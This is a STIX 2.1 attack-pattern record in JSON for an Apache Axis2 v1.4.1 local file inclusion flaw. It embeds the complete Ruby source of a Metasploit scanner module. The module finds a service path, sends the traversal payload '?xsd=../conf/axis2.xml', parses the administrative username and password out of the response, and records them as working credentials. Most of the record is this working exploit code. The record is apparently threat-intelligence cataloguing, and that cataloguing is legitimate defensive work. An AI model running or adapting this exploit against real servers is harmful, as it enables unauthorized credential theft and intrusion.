{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d865d20b-41b8-46dd-8ef4-b926fd187b4e",
    "created": "2024-08-14T16:29:17.905956Z",
    "modified": "2024-08-14T16:29:17.905959Z",
    "name": "Apache Axis2 v1.4.1 Local File Inclusion",
    "description": " This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability. By loading a local XML file which contains a cleartext username and password, attackers can trivially recover authentication credentials to Axis services.  'References'     => [ ['EDB', '12721'] ['OSVDB', '59001'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/axis_local_file_include.rb",
            "external_id": "axis_local_file_include.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',\n      'Description'    => %q{\n          This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.\n        By loading a local XML file which contains a cleartext username and password, attackers can trivially\n        recover authentication credentials to Axis services.\n      },\n      'References'     =>\n        [\n          ['EDB', '12721'],\n          ['OSVDB', '59001'],\n        ],\n      'Author'         =>\n        [\n          'Tiago Ferreira <tiago.ccna[at]gmail.com>'\n        ],\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),\n    ])\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path)\n\n    begin\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => uri,\n      }, 25)\n\n      if (res and res.code == 200)\n        res.body.to_s.match(/\\/axis2\\/services\\/([^\\s]+)\\?/)\n        new_uri = normalize_uri(\"/axis2/services/#{$1}\")\n        get_credentials(new_uri)\n\n      else\n        print_status(\"#{full_uri} - Apache Axis - The remote page not accessible\")\n        return\n\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def get_credentials(uri)\n    lfi_payload = \"?xsd=../conf/axis2.xml\"\n\n    begin\n      res = send_request_raw({\n        'method'  => 'GET',\n        'uri'     => \"#{uri}\" + lfi_payload,\n      }, 25)\n\n      print_status(\"#{full_uri} - Apache Axis - Dumping administrative credentials\")\n\n      if res.nil?\n        print_error(\"#{full_uri} - Connection timed out\")\n        return\n      end\n\n      if (res.code == 200)\n        if res.body.to_s.match(/axisconfig/)\n\n          res.body.scan(/parameter\\sname=\\\"userName\\\">([^\\s]+)</)\n          username = $1\n          res.body.scan(/parameter\\sname=\\\"password\\\">([^\\s]+)</)\n          password = $1\n\n          print_good(\"#{full_uri} - Apache Axis - Credentials Found Username: '#{username}' - Password: '#{password}'\")\n\n          report_cred(ip: rhost, port: rport, user: username, password: password, proof: res.body)\n\n        else\n          print_error(\"#{full_uri} - Apache Axis - Not Vulnerable\")\n          return :abort\n        end\n\n      else\n        print_error(\"#{full_uri} - Apache Axis - Unrecognized #{res.code} response\")\n        return :abort\n\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}